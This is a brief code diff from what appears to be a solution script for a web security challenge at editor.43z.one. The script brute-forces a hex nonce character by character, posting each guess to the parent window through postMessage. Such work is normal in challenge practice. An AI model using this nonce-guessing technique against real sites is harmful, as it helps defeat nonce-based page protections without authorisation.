@@ -969,7 +969,7 @@ https://editor.43z.one/j91ak/i check the console to see progress
 
       iteratenonce = async (partialNonce) => {
         console.log('iterating nonce starting with','${nonce}')
-        chars = ['a','b','c','d','e','f','0','1','2','3','4','5','6','7','8','9']
+        chars = '0123456789abcdef'.split('')
         for(ix=0; ix<chars.length;ix++){
           checkNonce = partialNonce+chars[ix]
           action = {
@@ -980,7 +980,7 @@ https://editor.43z.one/j91ak/i check the console to see progress
           }
           parent.postMessage(action, '*')
           console.log('checking', checkNonce)
-          await sleep('${sleepTime}')
+          await new Promise(r => setTimeout(r, ${sleepTime}))
         }
       }
       iteratenonce('${nonce}')
